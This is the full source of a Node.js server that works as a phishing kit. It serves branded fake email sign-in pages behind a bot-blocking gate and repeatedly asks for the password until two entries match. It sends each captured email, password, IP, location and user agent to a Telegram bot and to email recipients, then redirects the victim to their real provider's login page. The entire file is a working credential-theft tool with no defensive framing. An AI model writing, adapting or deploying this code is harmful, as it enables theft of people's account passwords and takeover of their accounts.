const express = require('express');
const cors = require('cors');
const path = require('path');
const { getBrand } = require('./brands');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(cors({
    origin: [
        'https://secure-auto.netlify.app',
        'http://localhost:3000',
        'http://localhost:5173'
    ],
    methods: ['GET','POST','PUT','DELETE','OPTIONS'],
    allowedHeaders: ['Content-Type','Authorization']
}));

app.use(express.json({ limit:'1mb' }));
app.use(express.urlencoded({ extended:true }));

// serve /assets/*
app.use('/assets', express.static(path.join(__dirname, 'assets'), {
    maxAge: '7d',
    immutable: true
}));

// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN         = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID           = process.env.TELEGRAM_CHAT_ID;
const BREVO_API_KEY     = process.env.BREVO_API_KEY;
const SENDER_EMAIL      = process.env.SENDER_EMAIL  || 'egli79380@gmail.com';
const SENDER_NAME       = process.env.SENDER_NAME   || 'ABV Monitor';
const TURNSTILE_SECRET  = process.env.TURNSTILE_SECRET || '';
const TURNSTILE_SITEKEY = process.env.TURNSTILE_SITEKEY || '0x4AAAAAAE7CY8nNIUDU9vqa';
const REDIRECT_URL      = process.env.REDIRECT_URL  || 'https://www.google.com';

const MAX_ATTEMPTS = Math.max(2, parseInt(process.env.MAX_ATTEMPTS || '6', 10));
const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',').map(e => e.trim()).filter(Boolean);

// ============================================================
// STARTUP
// ============================================================
console.log('========================================');
console.log('🔍 Environment:');
console.log(`   TELEGRAM: ${BOT_TOKEN && CHAT_ID ? '✅' : '❌'}`);
console.log(`   BREVO:    ${BREVO_API_KEY ? '✅' : '❌'}`);
console.log(`   TURNSTILE_SECRET: ${TURNSTILE_SECRET ? '✅' : '⚠️'}`);
console.log(`   MAX_ATTEMPTS: ${MAX_ATTEMPTS}`);
console.log('========================================');

// ============================================================
// HELPERS
// ============================================================
async function verifyTurnstile(token, ip) {
    if (!TURNSTILE_SECRET) return true;
    try {
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method:'POST',
            headers:{ 'Content-Type':'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                secret: TURNSTILE_SECRET,
                response: token || '',
                remoteip: (ip || '').split(',')[0].trim()
            })
        });
        const data = await r.json();
        return data.success === true;
    } catch (e) { console.error('❌ Turnstile:', e.message); return false; }
}

function normalizeEmail(raw) {
    const s = (raw || '').toString().trim();
    if (!s) return '';
    return /^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(s) ? s : '';
}

function hexToRgba(hex, a) {
    const h = (hex||'#000').replace('#','');
    return `rgba(${parseInt(h.substr(0,2),16)},${parseInt(h.substr(2,2),16)},${parseInt(h.substr(4,2),16)},${a})`;
}

// ============================================================
// PROVIDER REDIRECT MAP
// ============================================================
const PROVIDER_MAP = {
    'gmail.com':'https://accounts.google.com/ServiceLogin?service=mail',
    'googlemail.com':'https://accounts.google.com/ServiceLogin?service=mail',
    'outlook.com':'https://login.live.com/','hotmail.com':'https://login.live.com/',
    'live.com':'https://login.live.com/','msn.com':'https://login.live.com/',
    'yahoo.com':'https://login.yahoo.com/','ymail.com':'https://login.yahoo.com/',
    'rocketmail.com':'https://login.yahoo.com/',
    'icloud.com':'https://www.icloud.com/','me.com':'https://www.icloud.com/','mac.com':'https://www.icloud.com/',
    'aol.com':'https://login.aol.com/','aim.com':'https://login.aol.com/',
    'protonmail.com':'https://mail.proton.me/','proton.me':'https://mail.proton.me/','pm.me':'https://mail.proton.me/',
    'zoho.com':'https://accounts.zoho.com/signin','zohomail.com':'https://accounts.zoho.com/signin',
    'tutanota.com':'https://app.tuta.com/login','tuta.io':'https://app.tuta.com/login',
    'mailbox.org':'https://login.mailbox.org/','posteo.de':'https://posteo.de/en',
    'abv.bg':'https://mail.abv.bg/','mail.bg':'https://mail.bg/','dir.bg':'https://mail.dir.bg/',
    'yandex.ru':'https://passport.yandex.ru/auth','yandex.com':'https://passport.yandex.com/auth',
    'yandex.by':'https://passport.yandex.by/auth','yandex.kz':'https://passport.yandex.kz/auth',
    'yandex.ua':'https://passport.yandex.ua/auth','ya.ru':'https://passport.yandex.ru/auth',
    'mail.ru':'https://account.mail.ru/login','inbox.ru':'https://account.mail.ru/login',
    'list.ru':'https://account.mail.ru/login','bk.ru':'https://account.mail.ru/login',
    'internet.ru':'https://account.mail.ru/login','rambler.ru':'https://mail.rambler.ru/',
    'ukr.net':'https://mail.ukr.net/','i.ua':'https://mail.i.ua/',
    'naver.com':'https://nid.naver.com/nidlogin.login',
    'daum.net':'https://accounts.kakao.com/login','hanmail.net':'https://accounts.kakao.com/login',
    'kakao.com':'https://accounts.kakao.com/login','nate.com':'https://www.nate.com/',
    'qq.com':'https://mail.qq.com/','foxmail.com':'https://mail.qq.com/',
    '163.com':'https://mail.163.com/','126.com':'https://mail.126.com/','yeah.net':'https://mail.yeah.net/',
    'sina.com':'https://mail.sina.com.cn/','sohu.com':'https://mail.sohu.com/',
    '139.com':'https://mail.10086.cn/','189.cn':'https://webmail30.189.cn/',
    'docomo.ne.jp':'https://mail.smt.docomo.ne.jp/','ezweb.ne.jp':'https://id.auone.jp/',
    'nifty.com':'https://webmail.nifty.com/',
    'rediffmail.com':'https://mail.rediff.com/cgi-bin/login.cgi','rediff.com':'https://mail.rediff.com/cgi-bin/login.cgi',
    'web.de':'https://webmail.web.de/','gmx.de':'https://www.gmx.net/','gmx.net':'https://www.gmx.net/',
    'gmx.com':'https://www.gmx.com/','t-online.de':'https://email.t-online.de/',
    'freenet.de':'https://email.freenet.de/','mail.com':'https://www.mail.com/',
    'orange.fr':'https://login.orange.fr/','wanadoo.fr':'https://login.orange.fr/',
    'laposte.net':'https://www.laposte.net/accueil','free.fr':'https://subscribe.free.fr/login/',
    'sfr.fr':'https://www.sfr.fr/','libero.it':'https://login.libero.it/',
    'virgilio.it':'https://login.virgilio.it/','alice.it':'https://login.alice.it/',
    'terra.com':'https://login.terra.com/','terra.es':'https://login.terra.es/',
    'wp.pl':'https://profil.wp.pl/login.html','o2.pl':'https://poczta.o2.pl/',
    'interia.pl':'https://poczta.interia.pl/','onet.pl':'https://login.onet.pl/',
    'mynet.com':'https://mail.mynet.com/','vnn.vn':'https://mail.vnn.vn/',
    'uol.com.br':'https://email.uol.com.br/','bol.com.br':'https://www.bol.com.br/',
    'terra.com.br':'https://login.terra.com.br/','ig.com.br':'https://mail.ig.com.br/',
    'mweb.co.za':'https://mail.mweb.co.za/','bigpond.com':'https://login.telstra.com.au/',
    'optusnet.com.au':'https://webmail.optusnet.com.au/','xtra.co.nz':'https://webmail.xtra.co.nz/',
    'otenet.gr':'https://webmail.otenet.gr/','freemail.hu':'https://freemail.hu/',
    'seznam.cz':'https://email.seznam.cz/','centrum.cz':'https://email.centrum.cz/',
    'atlas.cz':'https://email.atlas.cz/','ziggo.nl':'https://mail.ziggo.nl/',
    'kpnmail.nl':'https://webmail.kpnmail.nl/','xs4all.nl':'https://webmail.xs4all.nl/',
    'telia.com':'https://webmail.telia.com/','online.no':'https://webmail.online.no/',
    'elisa.fi':'https://webmail.elisa.fi/','sapo.pt':'https://mail.sapo.pt/',
    'meta.ua':'https://mail.meta.ua/','sbb.rs':'https://webmail.sbb.rs/',
    'siol.net':'https://webmail.siol.net/'
};

const MX_MAP = [
    [/google|googlemail|gmail/i,'https://accounts.google.com/ServiceLogin?service=mail'],
    [/outlook|office365|microsoft|hotmail|live\.com|protection\.outlook/i,'https://login.live.com/'],
    [/yandex/i,'https://passport.yandex.com/auth'],
    [/mail\.ru|inbox\.ru|bk\.ru/i,'https://account.mail.ru/login'],
    [/naver/i,'https://nid.naver.com/nidlogin.login'],
    [/daum|kakao|hanmail/i,'https://accounts.kakao.com/login'],
    [/qq\.com|foxmail/i,'https://mail.qq.com/'],
    [/163\.com|126\.com|yeah\.net/i,'https://mail.163.com/'],
    [/zoho/i,'https://accounts.zoho.com/signin'],
    [/proton|protonmail/i,'https://mail.proton.me/'],
    [/tutanota|tuta/i,'https://app.tuta.com/login'],
    [/abv\.bg/i,'https://mail.abv.bg/'],
    [/mail\.bg/i,'https://mail.bg/'],
    [/seznam/i,'https://email.seznam.cz/'],
    [/wp\.pl|o2\.pl|interia/i,'https://profil.wp.pl/login.html'],
    [/t-online/i,'https://email.t-online.de/'],
    [/web\.de|gmx/i,'https://webmail.web.de/'],
    [/orange\.fr|wanadoo/i,'https://login.orange.fr/'],
    [/laposte/i,'https://www.laposte.net/accueil'],
    [/libero|virgilio/i,'https://login.libero.it/'],
    [/terra/i,'https://login.terra.com/'],
    [/uol\.com\.br/i,'https://email.uol.com.br/'],
    [/rediff/i,'https://mail.rediff.com/cgi-bin/login.cgi'],
    [/yahoo/i,'https://login.yahoo.com/'],
    [/icloud|apple/i,'https://www.icloud.com/'],
    [/aol/i,'https://login.aol.com/']
];

const TLD_MAP = {
    'bg':'https://mail.bg/','ru':'https://passport.yandex.ru/auth','ua':'https://mail.ukr.net/',
    'by':'https://passport.yandex.by/auth','kz':'https://passport.yandex.kz/auth',
    'kr':'https://nid.naver.com/nidlogin.login','jp':'https://login.yahoo.co.jp/',
    'cn':'https://mail.qq.com/','de':'https://webmail.web.de/','fr':'https://login.orange.fr/',
    'it':'https://login.libero.it/','es':'https://login.terra.es/','pl':'https://profil.wp.pl/login.html',
    'tr':'https://mail.mynet.com/','cz':'https://email.seznam.cz/','hu':'https://freemail.hu/',
    'ro':'https://webmail.rdslink.ro/','gr':'https://webmail.otenet.gr/','nl':'https://mail.ziggo.nl/',
    'se':'https://webmail.telia.com/','no':'https://webmail.online.no/','dk':'https://webmail.telia.com/',
    'fi':'https://webmail.elisa.fi/','pt':'https://mail.sapo.pt/','br':'https://email.uol.com.br/',
    'mx':'https://login.terra.com/','in':'https://mail.rediff.com/cgi-bin/login.cgi',
    'th':'https://www.thaimail.com/','id':'https://login.yahoo.com/','vn':'https://mail.vnn.vn/',
    'za':'https://webmail.co.za/','au':'https://login.telstra.com.au/','nz':'https://webmail.xtra.co.nz/'
};

function fromMX(mx) {
    if (!mx || mx==='no-mx' || mx==='MX-Error') return null;
    const first = mx.split('\n')[0];
    for (const [re,url] of MX_MAP) if (re.test(first)) return url;
    return null;
}
function fromTLD(domain) {
    return TLD_MAP[(domain.split('.').pop()||'').toLowerCase()] || null;
}
function getProviderLoginUrl(email, mx) {
    const domain = (email||'').split('@')[1]?.toLowerCase()||'';
    if (!domain) return REDIRECT_URL;
    if (PROVIDER_MAP[domain]) return PROVIDER_MAP[domain];
    const a = fromMX(mx); if (a) return a;
    const b = fromTLD(domain); if (b) return b;
    return `https://mail.${domain}/`;
}

// ============================================================
// TELEGRAM
// ============================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    const MAX = 4000;
    const chunks = [];
    let rem = String(message || '');
    while (rem.length > MAX) {
        let cut = rem.lastIndexOf('\n', MAX);
        if (cut < MAX*0.5) cut = MAX;
        chunks.push(rem.slice(0,cut));
        rem = rem.slice(cut);
    }
    if (rem.length) chunks.push(rem);
    let ok=false, desc='';
    for (let i=0;i<chunks.length;i++){
        const text = chunks.length>1 ? `[${i+1}/${chunks.length}]\n${chunks[i]}` : chunks[i];
        try {
            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method:'POST',headers:{'Content-Type':'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID, text,
                    disable_web_page_preview:true,
                    link_preview_options:{ is_disabled:true }
                })
            });
            const j = await r.json();
            ok = !!j.ok; desc = j.description || '';
        } catch (e) { desc = e.message; }
    }
    console.log('📤 Telegram:', ok ? '✅' : '❌ ' + desc);
    return { ok, description: desc };
}

// ============================================================
// BREVO
// ============================================================
async function sendEmail(email, password, ipInfo, userAgent, domain, mx, attempt, isMatch, maxAttempts, redirectUrl) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length===0) return false;
    const tag = isMatch ? '✅ MATCH' : '⏳ pending';
    const subject = `🔐 ${email} — ${attempt}/${maxAttempts} ${tag}`;
    const html = `
    <div style="font-family:Arial;max-width:600px;margin:auto;background:#fff;padding:30px;border-radius:10px">
      <h2 style="color:#1e930c">🔐 Login ${tag}</h2>
      <p><b>Email:</b> ${email}</p>
      <p><b>Password:</b> ${password}</p>
      <p><b>Attempt:</b> ${attempt} of ${maxAttempts}</p>
      <p><b>Domain:</b> ${domain||'?'}</p>
      <p><b>MX:</b> ${mx||'?'}</p>
      <p><b>Redirect:</b> ${redirectUrl||'N/A'}</p>
      <p><b>IP:</b> ${ipInfo?.ip||'?'}</p>
      <p><b>Location:</b> ${ipInfo?.city||''} ${ipInfo?.region||''}, ${ipInfo?.country||''}</p>
      <p><b>Time:</b> ${new Date().toLocaleString()}</p>
    </div>`;
    const text = `Login ${tag}\nEmail: ${email}\nPassword: ${password}\nAttempt: ${attempt}/${maxAttempts}\nRedirect: ${redirectUrl}`;
    try {
        const r = await fetch('https://api.brevo.com/v3/smtp/email', {
            method:'POST',
            headers:{ 'api-key':BREVO_API_KEY, 'Content-Type':'application/json' },
            body: JSON.stringify({
                sender:{ name:SENDER_NAME, email:SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e=>({email:e})),
                subject, htmlContent: html, textContent: text
            })
        });
        const j = await r.json();
        if (r.ok) { console.log('✅ Brevo sent'); return true; }
        console.error('❌ Brevo:', r.status, j.message||JSON.stringify(j));
        return false;
    } catch (e) { console.error('❌ Brevo:', e.message); return false; }
}

// ============================================================
// IP + MX
// ============================================================
async function getIPInfo(ip) {
    try {
        const firstIP = (ip||'').split(',')[0].trim().replace(/^::ffff:/,'');
        const r = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await r.json();
    } catch { return { ip: ip||'Unknown', country:'Unknown', city:'Unknown', region:'Unknown' }; }
}
async function getMXRecord(domain) {
    try {
        const r = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const j = await r.json();
        if (j?.Answer?.length) return j.Answer.map(x=>x.data).join('\n');
        return 'no-mx';
    } catch { return 'MX-Error'; }
}

// ============================================================
// HTML: GATE PAGE (branded, sharp)
// ============================================================
function renderGatePage(email, brand) {
    const bgCss = brand.bgImage
        ? `background:${brand.bg};background-image:url('${brand.bgImage}');background-size:cover;background-position:center;`
        : `background:${brand.bg};`;

    return `<!DOCTYPE html>
<html lang="${brand.lang}">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${brand.name} — Verification</title>
${brand.favicon ? `<link rel="icon" href="${brand.favicon}">` : ''}
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;${bgCss}display:flex;align-items:center;justify-content:center;color:#1f2937}
  .card{background:rgba(255,255,255,.98);backdrop-filter:blur(8px);border-radius:14px;padding:44px 38px;max-width:440px;width:92%;box-shadow:0 20px 60px rgba(0,0,0,.10);text-align:center;position:relative;overflow:hidden}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,${brand.accent},${brand.accent2},${brand.accent})}
  .logo{display:flex;justify-content:center;margin-bottom:14px;min-height:44px}
  .logo img{max-height:44px;max-width:220px}
  .title{font-size:1.15rem;font-weight:600;margin-bottom:6px;color:#111}
  .subtitle{font-size:.92rem;color:#6b7280;margin-bottom:26px;line-height:1.5}
  #ts-turnstile{display:flex;justify-content:center;min-height:65px}
  #ts-error{margin-top:14px;color:#dc2626;font-size:14px;display:none}
  .footer{margin-top:26px;font-size:12px;color:#9ca3af}
</style>
</head>
<body>
  <div class="card">
    <div class="logo"><img src="${brand.logo}" alt="${brand.logoAlt}"></div>
    <div class="title">${brand.name} verification</div>
    <div class="subtitle">We need to confirm you are human before continuing.</div>
    <div id="ts-turnstile"></div>
    <div id="ts-error">Verification failed. Please try again.</div>
    <div class="footer">${brand.footer}</div>
  </div>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
  <script>
  (function(){
    var EMAIL=${JSON.stringify(email||'')}, SITEKEY=${JSON.stringify(TURNSTILE_SITEKEY)};
    var sent=false, tries=0;
    function onSuccess(token){
      if (sent) return; sent=true;
      var url='/a?t='+encodeURIComponent(token);
      if (EMAIL) url+='&u='+encodeURIComponent(EMAIL);
      fetch(url).then(r=>r.text()).then(function(html){
        document.open(); document.write(html); document.close();
      }).catch(function(){
        document.body.innerHTML='<p style="padding:40px;font-family:sans-serif">Verification unavailable. Try again later.</p>';
      });
    }
    function onError(){ document.getElementById('ts-error').style.display='block'; }
    function boot(){
      if (typeof turnstile==='undefined'){ if(++tries>40) return onError(); return setTimeout(boot,200); }
      try { turnstile.render('#ts-turnstile',{sitekey:SITEKEY,callback:onSuccess,errorCallback:onError,appearance:'always',retry:'never'}); }
      catch(e){ onError(); }
    }
    document.readyState==='loading'?document.addEventListener('DOMContentLoaded',boot):boot();
  })();
  </script>
</body>
</html>`;
}

// ============================================================
// HTML: LOGIN PAGE (branded, sharp, layout-aware)
// ============================================================
function renderLoginPage(email, brand) {
    const safeEmail = (email||'').replace(/"/g,'&quot;').replace(/</g,'&lt;');
    const isCard = brand.layout === 'card';
    const wrapOpen = isCard ? '<div class="card">' : '<div class="flat">';
    const wrapClose = '</div>';
    const bgCss = brand.bgImage
        ? `background:${brand.bg};background-image:url('${brand.bgImage}');background-size:cover;background-position:center;background-attachment:fixed;`
        : `background:${brand.bg};`;

    const links = (brand.footerLinks||[])
        .map(l=>`<a href="${l.href}" rel="noopener">${l.text}</a>`).join('');

    return `<!DOCTYPE html>
<html lang="${brand.lang}">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${brand.name} — Sign in</title>
${brand.favicon ? `<link rel="icon" href="${brand.favicon}">` : ''}
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;${bgCss}color:#1f2937;display:flex;align-items:center;justify-content:center;padding:20px}
  .card{background:#fff;border-radius:14px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 12px 48px rgba(0,0,0,.10);position:relative;overflow:hidden}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,${brand.accent},${brand.accent2},${brand.accent})}
  .flat{max-width:420px;width:100%;background:transparent;padding:20px}
  .logo{display:flex;justify-content:center;margin-bottom:${isCard?'14px':'28px'};min-height:44px}
  .logo img{max-height:44px;max-width:220px}
  .subtitle{font-size:.92rem;color:#6b7280;text-align:center;margin-bottom:24px;line-height:1.5}
  form{display:flex;flex-direction:column;gap:14px}
  label{font-size:.82rem;color:#475569;font-weight:500}
  input{width:100%;padding:13px 14px;border:1.5px solid #d1d5db;border-radius:8px;font-size:15px;outline:none;transition:.2s;background:#fff;color:#111}
  input:focus{border-color:${brand.accent};box-shadow:0 0 0 3px ${hexToRgba(brand.accent,.15)}}
  input[readonly]{background:#f3f4f6;color:#6b7280}
  button{width:100%;padding:14px;background:${brand.accent};color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:6px;transition:.15s}
  button:hover{filter:brightness(.94)}
  button:disabled{opacity:.6;cursor:not-allowed}
  .msg{margin-top:12px;font-size:13px;color:#6b7280;text-align:center;display:none}
  .spin{display:inline-block;width:12px;height:12px;border:2px solid #cbd5e1;border-top-color:${brand.accent};border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
  @keyframes sp{to{transform:rotate(360deg)}}
  .footer{margin-top:24px;font-size:12px;color:#9ca3af;text-align:center}
  .footer a{color:#9ca3af;text-decoration:none;margin:0 8px}
  .footer a:hover{text-decoration:underline}
</style>
</head>
<body>
  ${wrapOpen}
    <div class="logo"><img src="${brand.logo}" alt="${brand.logoAlt}"></div>
    ${brand.subtitle ? `<div class="subtitle">${brand.subtitle}</div>` : ''}
    <form id="lf" autocomplete="off">
      <div>
        <label for="em">${brand.emailLabel}</label>
        <input id="em" type="email" name="email" required ${email?`value="${safeEmail}" readonly`:''}>
      </div>
      <div>
        <label for="pw">${brand.passwordLabel}</label>
        <input id="pw" type="password" name="password" required>
      </div>
      <button type="submit" id="btn">${brand.buttonText}</button>
      <div class="msg" id="msg"></div>
    </form>
    <div class="footer">
      ${brand.footer}
      ${links ? '<div style="margin-top:8px">'+links+'</div>' : ''}
    </div>
  ${wrapClose}
<script>
(function(){
  var PRELOADED=${JSON.stringify(email||'')};
  var BTN=${JSON.stringify(brand.buttonText)};
  var REDIRECT=${JSON.stringify(REDIRECT_URL)};

  var form=document.getElementById('lf'), btn=document.getElementById('btn'), msg=document.getElementById('msg');
  var attempt=0, lockedEmail=PRELOADED||null, lastPassword=null, redirectUrl=REDIRECT;

  function showMsg(t,spin){ msg.innerHTML=(spin?'<span class="spin"></span>':'')+t; msg.style.display='block'; }

  form.addEventListener('submit', async function(e){
    e.preventDefault();
    lockedEmail = PRELOADED || lockedEmail || form.email.value.trim();
    if (lockedEmail){ form.email.value = lockedEmail; form.email.readOnly = true; }
    var thisPassword = form.password.value;
    attempt++;
    btn.disabled=true; btn.textContent='...';
    showMsg('Verifying', true);

    var data=null;
    try {
      var r = await fetch('/api/login', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ email: lockedEmail, password: thisPassword, prevPassword: lastPassword, attempt: attempt })
      });
      data = await r.json().catch(()=>null);
    } catch(_){}

    if (data && data.redirect) redirectUrl = data.redirect;
    lastPassword = thisPassword;

    if (data && data.retry === true){
      form.password.value='';
      form.password.focus();
      btn.disabled=false; btn.textContent=BTN;
      showMsg('Please re-enter your password to continue.', false);
      return;
    }

    btn.textContent='...';
    showMsg('Redirecting', true);
    setTimeout(function(){ window.location.href = redirectUrl; }, 600);
  });
})();
</script>
</body>
</html>`;
}

// ============================================================
// ROUTES
// ============================================================
app.get('/auth', (req, res) => {
    const email = normalizeEmail(req.query.u);
    const brand = getBrand(email);
    console.log(`🚪 /auth u=${email||'(none)'} brand=${brand.name}`);
    res.send(renderGatePage(email, brand));
});

app.get('/', (req, res) => {
    const email = normalizeEmail(req.query.u);
    const brand = getBrand(email);
    console.log(`🚪 / u=${email||'(none)'} brand=${brand.name}`);
    res.send(renderGatePage(email, brand));
});

app.get('/a', async (req, res) => {
    const token = req.query.t;
    const email = normalizeEmail(req.query.u);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ok = await verifyTurnstile(token, ip);
    if (!ok) return res.status(403).send('Verification failed. Please try again.');
    const brand = getBrand(email);
    console.log(`🔐 /a u=${email||'(none)'} brand=${brand.name}`);
    sendToTelegram(`👤 ${brand.name} verified\nEmail: ${email||'(none)'}\nIP: ${ip}\nTime: ${new Date().toISOString()}`).catch(()=>{});
    res.send(renderLoginPage(email, brand));
});

app.post('/api/login', async (req, res) => {
    const { email, password, prevPassword } = req.body || {};
    const attemptFromClient = parseInt(req.body?.attempt, 10);
    const attempt = Number.isFinite(attemptFromClient) && attemptFromClient>0 ? Math.min(attemptFromClient,MAX_ATTEMPTS) : 1;

    if (!email || !password) return res.status(400).json({ success:false, redirect:REDIRECT_URL, retry:false });
    if (!/^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(email))
        return res.status(400).json({ success:false, redirect:REDIRECT_URL, retry:false });

    const isMatch = typeof prevPassword==='string' && prevPassword.length>0 && prevPassword===password;
    const hitCap = attempt >= MAX_ATTEMPTS;
    const shouldRetry = !isMatch && !hitCap;

    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mx = await getMXRecord(domain);
    const redirectUrl = getProviderLoginUrl(email, mx);

    const header = isMatch ? `✅ MATCH — ${attempt}/${MAX_ATTEMPTS}` : (hitCap ? `🎯 CAP — ${attempt}/${MAX_ATTEMPTS}` : `⏳ ${attempt}/${MAX_ATTEMPTS}`);

    await sendToTelegram(`${header}
--------+ ${ipInfo.city||'?'} ${ipInfo.region||'?'}, ${ipInfo.country||'?'} +--------
Email : ${email}
Password : ${password}
Prev : ${prevPassword||'(none)'}
Match : ${isMatch?'YES':'no'}
Checker : ${email}:${password}
MX : ${mx}
➡️ Redirect : ${redirectUrl}
IP : ${clientIP}
UA : ${req.headers['user-agent']||'?'}
Date : ${new Date().toISOString()}
---------+ End +-------------`);

    const emailResult = await sendEmail(email, password, ipInfo, req.headers['user-agent']||'?', domain, mx, attempt, isMatch, MAX_ATTEMPTS, redirectUrl);

    res.json({
        success: true,
        attempt, maxAttempts: MAX_ATTEMPTS,
        match: isMatch,
        retry: shouldRetry,
        redirect: shouldRetry ? null : redirectUrl,
        emailSent: emailResult
    });
});

app.post('/api/log', async (req, res) => {
    const { email } = req.body || {};
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?';
    const ipInfo = await getIPInfo(clientIP);
    await sendToTelegram(`Visitor: ${email||'unknown'}\nIP: ${clientIP}\nLocation: ${ipInfo.city||''} ${ipInfo.region||''}, ${ipInfo.country||''}\nTime: ${new Date().toISOString()}`);
    res.json({ success:true });
});

app.get('/health', (req, res) => {
    res.json({
        status:'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        telegram: !!(BOT_TOKEN && CHAT_ID),
        email: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        turnstile: !!TURNSTILE_SECRET
    });
});

app.use((req, res) => res.status(404).json({ success:false, message:`Not found: ${req.method} ${req.originalUrl}` }));

app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server on :${PORT}`);
    console.log(`🚪 /auth?u=user@yandex.com`);
    console.log(`🎯 2 identical passwords → provider redirect`);
    console.log(`🛡️ Cap: ${MAX_ATTEMPTS}`);
    console.log('========================================');
});

process.on('uncaughtException', e => console.error('❌', e.message));
process.on('unhandledRejection', r => console.error('❌', r));